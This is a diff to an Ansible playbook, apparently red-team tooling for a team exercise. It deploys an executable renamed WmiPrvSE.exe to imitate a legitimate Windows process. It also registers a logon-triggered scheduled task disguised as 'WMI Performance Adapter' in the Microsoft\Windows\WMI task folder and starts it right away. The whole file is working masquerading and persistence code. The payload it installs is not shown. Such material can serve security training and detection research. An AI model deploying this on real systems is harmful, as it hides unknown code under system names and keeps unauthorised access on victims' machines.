@@ -18,17 +18,20 @@
       ansible.windows.win_copy:
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
-
+        
     - name: Create and Start the persistent task
       ansible.windows.win_shell: |
         $taskAction = New-ScheduledTaskAction -Execute "{{ target_dir }}\WmiPrvSE.exe" -Argument "client"
         $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User "TEAM1\charliebrown"
         $taskPrincipal = New-ScheduledTaskPrincipal -UserId "TEAM1\charliebrown" -LogonType Interactive -RunLevel LeastPrivilege
         
+        $taskFolder = "\Microsoft\Windows\WMI\"
+        if (-not (Test-Path "C:\Windows\System32\Tasks\Microsoft\Windows\WMI")) {
+            New-Item -Path "C:\Windows\System32\Tasks\Microsoft\Windows\WMI" -ItemType Directory -Force | Out-Null
+        }
         
-        Register-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI\" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Force
+        Register-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath $taskFolder -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Force
         
+        Start-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath $taskFolder
         
-        Start-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI\"
-        
-        Write-Host "[+] Task created and started immediately."
+        Write-Host "[+] Folder created (if needed), task registered, and started."
